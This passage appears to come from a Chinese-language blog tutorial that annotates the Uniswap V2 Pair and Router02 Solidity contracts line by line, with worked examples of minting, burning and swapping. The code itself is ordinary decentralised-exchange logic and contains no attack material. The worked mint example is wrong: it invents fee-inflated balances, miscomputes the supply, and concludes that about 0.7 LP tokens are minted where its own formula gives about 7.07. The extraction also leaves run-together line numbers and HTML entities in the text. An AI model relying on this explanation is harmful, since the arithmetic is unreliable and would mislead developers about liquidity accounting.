_reserve0, amount1.mul(_totalSupply) / _reserve1); &#125; require(liquidity &gt; 0, &#x27;UniswapV2: INSUFFICIENT_LIQUIDITY_MINTED&#x27;); _mint(to, liquidity); // 为to铸币，liquidity _update(balance0, balance1, _reserve0, _reserve1); // 调用_update函数，更新当前合约中两个代币的储备量为最新的余额 if (feeOn) kLast = uint(reserve0).mul(reserve1); // reserve0 and reserve1 are up-to-date emit Mint(msg.sender, amount0, amount1); &#125; // this low-level function should be called from a contract which performs important safety checks // 销币操作，移除流动性 function burn(address to) external lock returns (uint amount0, uint amount1) &#123; (uint112 _reserve0, uint112 _reserve1,) = getReserves(); // gas savings address _token0 = token0; // gas savings address _token1 = token1; // gas savings uint balance0 = IERC20(_token0).balanceOf(address(this)); uint balance1 = IERC20(_token1).balanceOf(address(this)); uint liquidity = balanceOf[address(this)]; // 参考白皮书，为了节省交易手续费，Uniswap v2只在mint/burn流动性时收取累计的协议手续费。 bool feeOn = _mintFee(_reserve0, _reserve1); uint _totalSupply = totalSupply; // gas savings, must be defined here since totalSupply can update in _mintFee // 采用mint中计算 liquidity的方法倒推amount amount0 = liquidity.mul(balance0) / _totalSupply; // using balances ensures pro-rata distribution amount1 = liquidity.mul(balance1) / _totalSupply; // using balances ensures pro-rata distribution require(amount0 &gt; 0 &amp;&amp; amount1 &gt; 0, &#x27;UniswapV2: INSUFFICIENT_LIQUIDITY_BURNED&#x27;); // 销毁本合约的 流动性 liquidity _burn(address(this), liquidity); // 调用_token0(_token1)中的 transfer函数 // 通过各自token中实现的transfer将token转移回to _safeTransfer(_token0, to, amount0); _safeTransfer(_token1, to, amount1); //更新合约自身的token0、1余额 balance0 = IERC20(_token0).balanceOf(address(this)); balance1 = IERC20(_token1).balanceOf(address(this)); //更新池子中的储备量和价格积累器 _update(balance0, balance1, _reserve0, _reserve1); if (feeOn) kLast = uint(reserve0).mul(reserve1); // reserve0 and reserve1 are up-to-date emit Burn(msg.sender, amount0, amount1, to); &#125; // this low-level function should be called from a contract which performs important safety checks /** 实现两种代币的交换（交易）功能-----闪电贷功能 uint amount0Out：要转换的第一种代币的数量。 uint amount1Out：要转换的第二种代币的数量。 address to：接收转换后代币的目标地址。 bytes data：可选的额外数据，用于向目标地址提供更多信息。 */ // 接收者 to 必须要实现 `uniswapV2Call`函数，通过此函数输入交换的代币 function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external lock &#123; require(amount0Out &gt; 0 || amount1Out &gt; 0, &#x27;UniswapV2: INSUFFICIENT_OUTPUT_AMOUNT&#x27;); (uint112 _reserve0, uint112 _reserve1,) = getReserves(); // gas savings // 检查输出量是否小于储备量 require(amount0Out &lt; _reserve0 &amp;&amp; amount1Out &lt; _reserve1, &#x27;UniswapV2: INSUFFICIENT_LIQUIDITY&#x27;); uint balance0; uint balance1; &#123; // scope for _token&#123;0,1&#125;, avoids stack too deep errors address _token0 = token0; address _token1 = token1; // 检查接收地址是否合法 require(to != _token0 &amp;&amp; to != _token1, &#x27;UniswapV2: INVALID_TO&#x27;); if (amount0Out &gt; 0) _safeTransfer(_token0, to, amount0Out); // optimistically transfer tokens if (amount1Out &gt; 0) _safeTransfer(_token1, to, amount1Out); // optimistically transfer tokens // 如果有额外数据，就调用接收地址的回调函数 if (data.length &gt; 0) IUniswapV2Callee(to).uniswapV2Call(msg.sender, amount0Out, amount1Out, data); balance0 = IERC20(_token0).balanceOf(address(this)); balance1 = IERC20(_token1).balanceOf(address(this)); &#125; // 计算输入量 uint amount0In = balance0 &gt; _reserve0 - amount0Out ? balance0 - (_reserve0 - amount0Out) : 0; uint amount1In = balance1 &gt; _reserve1 - amount1Out ? balance1 - (_reserve1 - amount1Out) : 0; require(amount0In &gt; 0 || amount1In &gt; 0, &#x27;UniswapV2: INSUFFICIENT_INPUT_AMOUNT&#x27;); &#123; // scope for reserve&#123;0,1&#125;Adjusted, avoids stack too deep errors // 计算调整后的余额，因为在solidity中没有浮点数 0.3%，这样是为了模拟出 0.3% uint balance0Adjusted = balance0.mul(1000).sub(amount0In.mul(3)); uint balance1Adjusted = balance1.mul(1000).sub(amount1In.mul(3)); require(balance0Adjusted.mul(balance1Adjusted) &gt;= uint(_reserve0).mul(_reserve1).mul(1000**2), &#x27;UniswapV2: K&#x27;); &#125; _update(balance0, balance1, _reserve0, _reserve1); emit Swap(msg.sender, amount0In, amount1In, amount0Out, amount1Out, to); &#125; // force balances to match reserves /** 用于移除资金池中多余代币的函数。它的作用是将代币池中多余的代币转移到指定的目标地址，以便于在资金池中保持正确的代币比例 */ function skim(address to) external lock &#123; address _token0 = token0; // gas savings address _token1 = token1; // gas savings _safeTransfer(_token0, to, IERC20(_token0).balanceOf(address(this)).sub(reserve0)); _safeTransfer(_token1, to, IERC20(_token1).balanceOf(address(this)).sub(reserve1)); &#125; // force reserves to match balances // 同步，迫使代币余额与代币储量相匹配，调用_update函数 function sync() external lock &#123; _update(IERC20(token0).balanceOf(address(this)), IERC20(token1).balanceOf(address(this)), reserve0, reserve1); &#125;&#125; 分析 mint函数，举例 假设有一个流动性池，其中有 10 个 ETH 和 5000 个 USDC，总供应量为 70.71 个流动性代币（这里面包括过去交易留下的Fees）。现在，有人想向这个池中添加 1 个 ETH 和 500 个 USDC，以获得更多的流动性代币。那么，他们将获得多少流动性代币呢？ 首先，我们需要计算添加后的两种代币的储备量和余额。储备量等于原来的储备量加上添加的数量，余额等于储备量加上协议手续费（假设为 0.3%）。因此，我们有： 储备量：reserve0 &#x3D; 10 + 1 &#x3D; 11 ETH，reserve1 &#x3D; 5000 + 500 &#x3D; 5500 USDC 余额：balance0 &#x3D; reserve0 * (1 + 0.003) &#x3D; 11.033 ETH，balance1 &#x3D; reserve1 * (1 + 0.003) &#x3D; 5516.5 USDC 接下来，我们需要计算添加后的总供应量。如果是第一次添加流动性，则使用公式 sqrt(x * y) — MINIMUM_LIQUIDITY，否则使用公式 min(x * totalSupply &#x2F; reserve0, y * totalSupply &#x2F; reserve1)。因为这不是第一次添加流动性，所以我们使用后者。因此，我们有： 总供应量：totalSupply &#x3D; min(balance0 * 70.71 &#x2F; reserve0, balance1 * 70.71 &#x2F; reserve1) &#x3D; min(71.41, 71.41) &#x3D; 71.41 最后，我们需要计算添加者获得的流动性代币的数量。这个数量等于添加后的总供应量减去添加前的总供应量。因此，我们有： 流动性代币：liquidity &#x3D; totalSupply — 70.71 &#x3D; 71.41–70.71 &#x3D; 0.7 也就是说，添加者将获得大约 0.7 个流动性代币。 分析burn,举例 假设有一个池子，它允许交易 ETH 和 DAI，它的地址是 0xA478c2975Ab1Ea89e8196811F51A7B7Ade33eB11。这个池子有以下的状态： 流动性代币的总供应量是 3,000,000。 池子里有 10,000 个 ETH 和 4,000,000 个 DAI。 协议费用是 0.05%。 你拥有 30,000 个流动性代币，也就是池子的 1%。 现在，你想要退出这个池子，把你的流动性代币销毁，并拿回你的 ETH 和 DAI。你可以调用这个函数，把 to 参数设为你自己的地址。这样，函数会做以下的事情： 它会从池子里获取 ETH 和 DAI 的储备量，分别是 _reserve0 = 10,000 和 _reserve1 = 4,000,000。 它会获取 ETH 和 DAI 的地址，分别是 _token0 = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2 和 _token1 = 0x6B175474E89094C44Da98b954EedeAC495271d0F。 它会获取合约自身的 ETH 和 DAI 的余额，分别是 balance0 = 10,000 和 balance1 = 4,000,000。注意，这里假设没有其他人在同一区块内与池子交互，否则余额可能会有变化。 它会获取合约自身的流动性代币余额，也就是 liquidity = 30,000。 它会调用 _mintFee 函数，来分发协议费用给流动性提供者。假设在你加入池子后，没有发生过任何交易，那么协议费用就是零，所以 _mintFee 函数不会改变任何东西，并返回 feeOn = false。 它会计算你能够拿回的 ETH 和 DAI 的数量，分别是 amount0 = liquidity * balance0 / totalSupply = 30,000 * 10,000 / 3,000,000 = 100 和 amount1 = liquidity * balance1 / totalSupply = 30,000 * 4,000,000 / 3,000,000 = 40,000。这保证了按比例分配。 知识点： abi.decode(data, (bool))是Solidity中的一种函数调用，用于将字节数组（byte array）解码为布尔值（bool）类型。 具体来说，abi.decode函数接受两个参数：字节数组和数据类型。在这里，字节数组是要解码的数据，数据类型是要解码成的目标类型，即布尔值。 函数调用abi.decode(data, (bool))将字节数组解码为一个布尔值。这个布尔值的值取决于字节数组中的数据。如果字节数组中的数据为0，则解码后的布尔值为false，否则为true。 知识点： UQ112x112.encode(_reserve1).uqdiv(_reserve0) UQ112x112.encode(_reserve1).uqdiv(_reserve0)是Uniswap V2中的一个计算交易价格的操作，使用了UQ112x112固定点数算法。 具体来说，_reserve0和_reserve1是Uniswap V2交易对中两种资产的余额（reserve），UQ112x112.encode()函数将余额编码为UQ112x112固定点数格式，然后使用了.uqdiv()函数对两种资产的余额进行了除法操作，计算出当前的交易价格。 UQ112x112固定点数算法是一种用于在以太坊合约中进行精确数学计算的算法。它将浮点数转换为整数，并使用固定的小数位数进行计算。在Uniswap V2中，UQ112x112固定点数算法被广泛应用于计算交易价格和资金池分配等。 在这个操作中，UQ112x112.encode(_reserve1)将_reserve1编码为UQ112x112格式，然后.uqdiv(_reserve0)将编码后的_reserve1除以_reserve0。最终的结果是一个UQ112x112格式的数，表示当前的交易价格。 v2-periphery1. UniswapV2Router02123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406407408409410411412413414415416417418419420421422423424425426427428429430431432433434435436437438439440441442443444445446447448449450451452453454455456457458459460461462463464465466467468469470471472473474475476477478479480481482483484485486487488489490491492493494495496497498499500501502503504505506507508509510511512513514515516517518519520521522523524pragma solidity =0.6.6;import &#x27;@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol&#x27;;import &#x27;@uniswap/lib/contracts/libraries/TransferHelper.sol&#x27;;import &#x27;./interfaces/IUniswapV2Router02.sol&#x27;;import &#x27;./libraries/UniswapV2Library.sol&#x27;;import &#x27;./libraries/SafeMath.sol&#x27;;import &#x27;./interfaces/IERC20.sol&#x27;;import &#x27;./interfaces/IWETH.sol&#x27;;contract UniswapV2Router02 is IUniswapV2Router02 &#123; using SafeMath for uint; address public immutable override factory; address public immutable override WETH; // 修饰器确保 操作在截止日期之前 modifier ensure(uint deadline) &#123; require(deadline &gt;= block.timestamp, &#x27;UniswapV2Router: EXPIRED&#x27;); _; &#125; // 初始化factory 和 WETH地址 constructor(address _factory, address _WETH) public &#123; factory = _factory; WETH = _WETH; &#125; // 接收ETH receive() external payable &#123; assert(msg.sender == WETH); // only accept ETH via fallback from the WETH contract &#125; // **** ADD LIQUIDITY **** /** _addLiquidity可以帮助计算最佳汇率。如果是首次添加流动性，则会先创建交易对合约； 否则根据当前池子余额计算应该注入的最佳代币数量。 */ function _addLiquidity( address tokenA, // 代币A address tokenB, // 代币B uint amountADesired, // 希望存入的代币A数量 uint amountBDesired, // 希望存入的代币B数量 uint amountAMin, // 最少存入的代币A数量 uint amountBMin // 最少存入的代币B数量 ) internal virtual returns (uint amountA, uint amountB) &#123; // create the pair if it doesn&#x27;t exist yet if (IUniswapV2Factory(factory).getPair(tokenA, tokenB) == address(0)) &#123; IUniswapV2Factory(factory).createPair(tokenA, tokenB); &#125; // 获取交易对中代币A B的存储量 (uint reserveA, uint reserveB) = UniswapV2Library.getReserves(factory, tokenA, tokenB); // 如果储备量都为 0，那两个预期支付额就是成交量 if (reserveA == 0 &amp;&amp; reserveB == 0) &#123; (amountA, amountB) = (amountADesired, amountBDesired); &#125; else &#123; // 采用控制变量法算出最佳的汇率 /** 如果计算得出的结果值 amountBOptimal 不比 amountBDesired 大，且不会小于 amountBMin， 就可将 amountADesired 和该 amountBOptimal 作为结果值返回。 如果 amountBOptimal 大于 amountBDesired，则根据 amountBDesired 计算得出需要支付多少 tokenA， 得到 amountAOptimal，只要 amountAOptimal 不大于 amountADesired 且不会小于 amountAMin， 就可将 amountAOptimal 和 amountBDesired 作为结果值返回。 */ // 调用quote函数，换算amountADesired 对应的B代币为多少 uint amountBOptimal = UniswapV2Library.quote(amountADesired, reserveA, reserveB); // 最佳的B代币数量少于希望存入的代币B数量 if (amountBOptimal &lt;= amountBDesired) &#123; // 这是定 amountADesired，求B的最佳数量 // 而且最佳B代币数量要求 &gt;= amountBMin require(amountBOptimal &gt;= amountBMin, &#x27;UniswapV2Router: INSUFFICIENT_B_AMOUNT&#x27;); // 返回希望存入的A，和最佳的B数量 (amountA, amountB) = (amountADesired, amountBOptimal); &#125; else &#123; // 定amountBDesired，求A的最佳数量 // 调用quote函数，换算amountBDesired 对应的A代币为多少 uint amountAOptimal = UniswapV2Library.quote(amountBDesired, reserveB, reserveA); assert(amountAOptimal &lt;= amountADesired); require(amountAOptimal &gt;= amountAMin, &#x27;UniswapV2Router: INSUFFICIENT_A_AMOUNT&#x27;); // 返回希望存入的B，和最佳的A数量 (amountA, amountB) = (amountAOptimal, amountBDesired); &#125; &#125; &#125; function addLiquidity( address tokenA, // 代币A address tokenB, // 代币B uint amountADesired, // 希望存入的代币A数量 uint amountBDesired, // 希望存入的代币B数量 uint amountAMin, // 用户可接受的最小成交代币A数量 uint amountBMin, // 用户可接受的最小成交代币B数量 address to, // 流动性代币接收地址 uint deadline // 该笔交易的有效时间，如果超过该时间还没得到交易处理就直接失效不进行交易了 ) external virtual override ensure(deadline) returns (uint amountA, uint amountB, uint liquidity) &#123; // 调用_addLiquidity函数，返回 代币A和代币B 的最佳汇率 (amountA, amountB) = _addLiquidity(tokenA, tokenB, amountADesired, amountBDesired, amountAMin, amountBMin); // 获取交易对地址 address pair = UniswapV2Library.pairFor(factory, tokenA, tokenB); // 调用tokenA的`transferFrom`函数，实现msg.sender向交易对pair转入amountA代币 TransferHelper.safeTransferFrom(tokenA, msg.sender, pair, amountA); TransferHelper.safeTransferFrom(tokenB, msg.sender, pair, amountB); // 获取存入代币后uniswapv2中的流动性 liquidity = IUniswapV2Pair(pair).mint(to); &#125; /** 添加流动性 */ function addLiquidityETH( address token, uint amountTokenDesired, uint amountTokenMin, uint amountETHMin, address to, uint deadline ) external virtual override payable ensure(deadline) returns (uint amountToken, uint amountETH, uint liquidity) &#123; // 调用_addLiquidity函数，返回 TOken和ETH的最佳汇率 (amountToken, amountETH) = _addLiquidity( token, WETH, amountTokenDesired, msg.value, amountTokenMin, amountETHMin ); // 获取交易对地址 address pair = UniswapV2Library.pairFor(factory, token, WETH); // 调用token的`transferFrom`函数，实现msg.sender向交易对pair转入amountToken代币 TransferHelper.safeTransferFrom(token, msg.sender, pair, amountToken); // 先把amountETH数量的ETH存入本合约 IWETH(WETH).deposit&#123;value: amountETH&#125;(); // 再将amount数量的WETH转入交易对中 assert(IWETH(WETH).transfer(pair, amountETH)); // 获取存入代币后uniswapv2中的流动性 liquidity = IUniswapV2Pair(pair).mint(to); // refund dust eth, if any // 如果还有剩余的ETH，将退还 if (msg.value &gt; amountETH) TransferHelper.safeTransferETH(msg.sender, msg.value - amountETH); &#125; // **** REMOVE LIQUIDITY **** // 移除流动性 function removeLiquidity( address tokenA, address tokenB, uint liquidity, uint amountAMin, uint amountBMin, address to, uint deadline ) public virtual override ensure(deadline) returns (uint amountA, uint amountB) &#123; // 获取交易对地址 address pair = UniswapV2Library.pairFor(factory, tokenA, tokenB); // 将流动性代币从用户划转到 pair 合约 IUniswapV2Pair(pair).transferFrom(msg.sender, pair, liquidity); // send liquidity to pair // 收到的流动性代币占全部代币比例 (uint amount0, uint amount1) = IUniswapV2Pair(pair).burn(to); (address token0,) = UniswapV2Library.sortTokens(tokenA, tokenB); (amountA, amountB) = tokenA == token0 ? (amount0, amount1) : (amount1, amount0); // 如果低于用户设定的最低预期（amountAMin/amountBMin），则回滚交易 require(amountA &gt;= amountAMin, &#x27;UniswapV2Router: INSUFFICIENT_A_AMOUNT&#x27;); require(amountB &gt;= amountBMin, &#x27;UniswapV2Router: INSUFFICIENT_B_AMOUNT&#x27;); &#125; function removeLiquidityETH( address token, //待移除流动性的代币地址 uint liquidity, // 要移除的流动性数量 uint amountTokenMin, // 用户愿意接受的最小代币数量，如果实际返回的代币数量小于该值，则函数会抛出异常 uint amountETHMin, // 用户愿意接受的最小ETH数量，如果实际返回的ETH数量小于该值，则函数会抛出异常 address to, // 代币和ETH将被发送到的目标地址 uint deadline // 操作的截止时间，必须在该时间之前完成操作，否则操作将被视为无效 ) public virtual override ensure(deadline) returns (uint amountToken, uint amountETH) &#123; // 调用 removeLiquidity，得到退还的 Token 和 ETH // removeLiquidity中执行了 `burn`但是是将token和ETH转移到了addrss(this),说明还可以执行 safeTransfer 和 withdraw (amountToken, amountETH) = removeLiquidity( token, WETH, liquidity, amountTokenMin, amountETHMin, address(this), deadline ); // 向to转账(token) TransferHelper.safeTransfer(token, to, amountToken); // 将weth取出来，暂时存在addrss(this) IWETH(WETH).withdraw(amountETH); // 将address(this)中的WETH转到指定地址to TransferHelper.safeTransferETH(to, amountETH); &#125; // 其实就是在调用实际的 removeLiquidity 之前先用 permit 方式完成授权操作 function removeLiquidityWithPermit( address tokenA, address tokenB, uint liquidity, uint amountAMin, uint amountBMin, address to, uint deadline, bool approveMax, uint8 v, bytes32 r, bytes32 s ) external virtual override returns (uint amountA, uint amountB) &#123; address pair = UniswapV2Library.pairFor(factory, tokenA, tokenB); uint value = approveMax ? uint(-1) : liquidity; IUniswapV2Pair(pair).permit(msg.sender, address(this), value, deadline, v, r, s); (amountA, amountB) = removeLiquidity(tokenA, tokenB, liquidity, amountAMin, amountBMin, to, deadline); &#125; // 在调用实际的 removeLiquidity 之前先用 permit 方式完成授权操作 function removeLiquidityETHWithPermit( address token, uint liquidity, uint amountTokenMin, uint amountETHMin, address to, uint deadline, bool approveMax, uint8 v, bytes32 r, bytes32 s ) external virtual override returns (uint amountToken, uint amountETH) &#123; address pair = UniswapV2Library.pairFor(factory, token, WETH); uint value = approveMax ? uint(-1) : liquidity; IUniswapV2Pair(pair).permit(msg.sender, address(this), value, deadline, v, r, s); (amountToken, amountETH) = removeLiquidityETH(token, liquidity, amountTokenMin, amountETHMin, to, deadline); &#125; // **** REMOVE LIQUIDITY (supporting fee-on-transfer tokens) **** /** 返回值没有 amountToken； 调用 removeLiquidity 后也没有 amountToken 值返回 进行 safeTransfer 时传值直接读取当前地址的 token 余额。 */ function removeLiquidityETHSupportingFeeOnTransferTokens( address token, uint liquidity, uint amountTokenMin, uint amountETHMin, address to, uint deadline ) public virtual override ensure(deadline) returns (uint amountETH) &#123; (, amountETH) = removeLiquidity( token, WETH, liquidity, amountTokenMin, amountETHMin, address(this), deadline ); TransferHelper.safeTransfer(token, to, IERC20(token).balanceOf(address(this))); IWETH(WETH).withdraw(amountETH); TransferHelper.safeTransferETH(to, amountETH); &#125; function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens( address token, uint liquidity, uint amountTokenMin, uint amountETHMin, address to, uint deadline, bool approveMax, uint8 v, bytes32 r, bytes32 s ) external virtual override returns (uint amountETH) &#123; address pair = UniswapV2Library.pairFor(factory, token, WETH); uint value = approveMax ? uint(-1) : liquidity; IUniswapV2Pair(pair).permit(msg.sender, address(this), value, deadline, v, r, s); amountETH = removeLiquidityETHSupportingFeeOnTransferTokens( token, liquidity, amountTokenMin, amountETHMin, to, deadline ); &#125; // **** SWAP **** // requires the initial amount to have already been sent to the first pair function _swap(uint[] memory amounts, address[] memory path, address _to) internal virtual &#123; /** 历整个兑换路径，并对路径中每两个配对的 token 调用 pair 合约的兑换函数，实现底层的兑换处理 */ for (uint i; i &lt; path.length - 1; i++) &#123; (address input, address output) = (path[i], path[i + 1]); (address token0,) = UniswapV2Library.sortTokens(input, output); uint amountOut = amounts[i + 1]; // 如下语句是在判断要兑换的是哪种 货币，比如 A 或者 B (uint amount0Out, uint amount1Out) = input == token0 ? (uint(0), amountOut) : (amountOut, uint(0)); address to = i &lt; path.length - 2 ? UniswapV2Library.pairFor(factory, output, path[i + 2]) : _to; IUniswapV2Pair(UniswapV2Library.pairFor(factory, input, output)).swap( amount0Out, amount1Out, to, new bytes(0) ); &#125; &#125; /** 用 ERC20 兑换 ERC20，但支付的数量是指定的，而兑换回的数量则是未确定的 */ function swapExactTokensForTokens( uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline ) external virtual override ensure(deadline) returns (uint[] memory amounts) &#123; amounts = UniswapV2Library.getAmountsOut(factory, amountIn, path); require(amounts[amounts.length - 1] &gt;= amountOutMin, &#x27;UniswapV2Router: INSUFFICIENT_OUTPUT_AMOUNT&#x27;); // 将支付的代币转到 pair 合约 TransferHelper.safeTransferFrom( path[0], msg.sender, UniswapV2Library.pairFor(factory, path[0], path[1]), amounts[0] ); _swap(amounts, path, to); &#125; /** 用 ERC20 兑换 ERC20，与上一个函数不同，指定的是兑换回的数量 */ function swapTokensForExactTokens( uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline ) external virtual override ensure(deadline) returns (uint[] memory amounts) &#123; amounts = UniswapV2Library.getAmountsIn(factory, amountOut, path); require(amounts[0] &lt;= amountInMax, &#x27;UniswapV2Router: EXCESSIVE_INPUT_AMOUNT&#x27;); TransferHelper.safeTransferFrom( path[0], msg.sender, UniswapV2Library.pairFor(factory, path[0], path[1]), amounts[0] ); _swap(amounts, path, to); &#125; /** 指定 ETH 数量兑换 ERC20 */ function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline) external virtual override payable ensure(deadline) returns (uint[] memory amounts) &#123; require(path[0] == WETH, &#x27;UniswapV2Router: INVALID_PATH&#x27;); amounts = UniswapV2Library.getAmountsOut(factory, msg.value, path); require(amounts[amounts.length - 1] &gt;= amountOutMin, &#x27;UniswapV2Router: INSUFFICIENT_OUTPUT_AMOUNT&#x27;); IWETH(WETH).deposit&#123;value: amounts[0]&#125;(); assert(IWETH(WETH).transfer(UniswapV2Library.pairFor(factory, path[0], path[1]), amounts[0])); _swap(amounts, path, to); &#125; /** 用 ERC20 兑换成指定数量的 ETH */ function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline) external virtual override ensure(deadline) returns (uint[] memory amounts) &#123; require(path[path.length - 1] == WETH, &#x27;UniswapV2Router: INVALID_PATH&#x27;); amounts = UniswapV2Library.getAmountsIn(factory, amountOut, path); require(amounts[0] &lt;= amountInMax, &#x27;UniswapV2Router: EXCESSIVE_INPUT_AMOUNT&#x27;); TransferHelper.safeTransferFrom( path[0], msg.sender, UniswapV2Library.pairFor(factory, path[0], path[1]), amounts[0] ); _swap(amounts, path, address(this)); IWETH(WETH).withdraw(amounts[amounts.length - 1]); TransferHelper.safeTransferETH(to, amounts[amounts.length - 1]); &#125; /** 用指定数量的 ERC20 兑换 ETH */ function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external virtual override ensure(deadline) returns (uint[] memory amounts) &#123; require(path[path.length - 1] == WETH, &#x27;UniswapV2Router: INVALID_PATH&#x27;); amounts = UniswapV2Library.getAmountsOut(factory, amountIn, path); require(amounts[amounts.length - 1] &gt;= amountOutMin, &#x27;UniswapV2Router: INSUFFICIENT_OUTPUT_AMOUNT&#x27;); TransferHelper.safeTransferFrom( path[0], msg.sender, UniswapV2Library.pairFor(factory, path[0], path[1]), amounts[0] ); _swap(amounts, path, address(this)); IWETH(WETH).withdraw(amounts[amounts.length - 1]); TransferHelper.safeTransferETH(to, amounts[amounts.length - 1]); &#125; /** 用 ETH 兑换指定数量的 ERC20 */ function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline) external virtual override payable ensure(deadline) returns (uint[] memory amounts) &#123; require(path[0] == WETH, &#x27;UniswapV2Router: INVALID_PATH&#x27;); amounts = UniswapV2Library.getAmountsIn(factory, amountOut, path); require(amounts[0] &lt;= msg.value, &#x27;UniswapV2Router: EXCESSIVE_INPUT_AMOUNT&#x27;); IWETH(WETH).deposit&#123;value: amounts[0]&#125;(); assert(IWETH(WETH).transfer(UniswapV2Library.pairFor(factory, path[0], path[1]), amounts[0])); _swap(amounts, path, to); // refund dust eth, if any if (msg.value &gt; amounts[0]) TransferHelper.safeTransferETH(msg.sender, msg.value - amounts[0]); &#125; // **** SWAP (supporting fee-on-transfer tokens) **** // requires the initial amount to have already been sent to the first pair function _swapSupportingFeeOnTransferTokens(address[] memory path, address _to) internal virtual &#123; for (uint i; i &lt; path.length - 1; i++) &#123; (address input, address output) = (path[i], path[i + 1]); (address token0,) = UniswapV2Library.sortTokens(input, output); IUniswapV2Pair pair = IUniswapV2Pair(UniswapV2Library.pairFor(factory, input, output)); uint amountInput; uint amountOutput; &#123; // scope to avoid stack too deep errors (uint reserve0, uint reserve1,) = pair.getReserves(); (uint reserveInput, uint reserveOutput) = input == token0 ? (reserve0, reserve1) : (reserve1, reserve0); amountInput = IERC20(input).balanceOf(address(pair)).sub(reserveInput); amountOutput = UniswapV2Library.getAmountOut(amountInput, reserveInput, reserveOutput); &#125; (uint amount0Out, uint amount1Out) = input == token0 ? (uint(0), amountOutput) : (amountOutput, uint(0)); address to = i &lt; path.length - 2 ? UniswapV2Library.pairFor(factory, output, path[i + 2]) : _to; pair.swap(amount0Out, amount1Out, to, new bytes(0)); &#125; &#125; /** 指定数量的 ERC20 兑换 ERC20，支持转账时扣费 */ function swapExactTokensForTokensSupportingFeeOnTransferTokens( uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline ) external virtual override ensure(deadline) &#123; TransferHelper.safeTransferFrom( path[0], msg.sender, UniswapV2Library.pairFor(factory, path[0], path[1]), amountIn ); uint balanceBefore = IERC20(path[path.length - 1]).balanceOf(to); _swapSupportingFeeOnTransferTokens(path, to); require( IERC20(path[path.length - 1]).balanceOf(to).sub(balanceBefore) &gt;= amountOutMin, &#x27;UniswapV2Router: INSUFFICIENT_OUTPUT_AMOUNT&#x27; ); &#125; /** 指定数量的 ETH 兑换 ERC20，支持转账时扣费 */ function swapExactETHForTokensSupportingFeeOnTransferTokens( uint amountOutMin, address[] calldata path, address to, uint deadline ) external virtual override payable ensure(deadline) &#123; require(path[0] == WETH, &#x27;UniswapV2Router: INVALID_PATH&#x27;); uint amountIn = msg.value; IWETH(WETH).deposit&#123;value: amountIn&#125;(); assert(IWETH(WETH).transfer(UniswapV2Library.pairFor(factory, path[0], path[1]), amountIn)); uint balanceBefore = IERC20(path[path.length - 1]).balanceOf(to); _swapSupportingFeeOnTransferTokens(path, to); require( IERC20(path[path.length - 1]).balanceOf(to).sub(balanceBefore) &gt;= amountOutMin, &#x27;UniswapV2Router: INSUFFICIENT_OUTPUT_AMOUNT&#x27; ); &#125; /** 指定数量的 ETH 兑换 ERC20，支持转账时扣费 */ function swapExactTokensForETHSupportingFeeOnTransferTokens( uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline ) external virtual override ensure(deadline) &#123; require(path[path.length - 1] == WETH, &#x27;UniswapV2Router: INVALID_PATH&#x27;); TransferHelper.safeTransferFrom( path[0], msg.sender, UniswapV2Library.pairFor(factory, path[0], path[1]), amountIn ); _swapSupportingFeeOnTransferTokens(path, address(this)); uint amountOut = IERC20(WETH).balanceOf(address(this)); require(amountOut &gt;= amountOutMin, &#x27;UniswapV2Router: INSUFFICIENT_OUTPUT_AMOUNT&#x27;); IWETH(WETH).withdraw(amountOut); TransferHelper.safeTransferETH(to, amountOut); &#125; // **** LIBRARY FUNCTIONS **** function quote(uint amountA, uint reserveA, uint reserveB) public pure virtual override returns (uint amountB) &#123; return UniswapV2Library.quote(amountA, reserveA, reserveB); &#125; function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) public pure virtual override returns (uint amountOut) &#123; return UniswapV2Library.getAmountOut(amountIn, reserveIn, reserveOut); &#125; function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) public pure virtual override returns (uint amountIn) &#123; return UniswapV2Library.getAmountIn(amountOut, reserveIn, reserveOut); &#125; function getAmountsOut(uint amountIn, address[] memory path) public view virtual override returns (uint[] memory amounts) &#123; return UniswapV2Library.getAmountsOut(factory, amountIn, path); &#125; function getAmountsIn(uint amountOut, address[] memory path) public view virtual override returns (uint[] memory amounts) &#123; return UniswapV2Library.getAmountsIn(factory, amountOut, path); &#125;&#125; **解读 addLiquidity中的amountAMin 和 amountBMin ** 该值一般是由前端根据预期值和滑点值计算得出的。比如，预期值 amountADesired 为 1000，设置的滑点为 0.5%，那就可以计算得出可接受的最小值 amountAMin 为 1000 * (1 - 0.5%) &#x3D; 995。 addLiquidityETH addLiquidityETH 则支付的其中一个 token 则是 ETH，而不是 ERC20 代币。来看看其代码实现： 可看到，入参不再是两个 token 地址，而只有一个 token 地址，因为另一个是以太坊主币 ETH。预期支付的 ETH 金额也是直接从 msg.value 读取的，所以入参里也不需要 ETH 的 Desired 参数。但是会定义 amountETHMin 表示愿意接受成交的 ETH 最小额。 实现逻辑上，请注意，调用 _addLiquidity 时传入的第二个参数是 WETH。其实，addLiquidityETH 实际上也是将 ETH 转为 WETH 进行处理的。可以看到代码中还有这么一行： 1IWETH(WETH).deposit&#123;value: amountETH&#125;(); 这就是将用户转入的 ETH 转成了 WETH。 而最后一行代码则会判断，如果一开始支付的 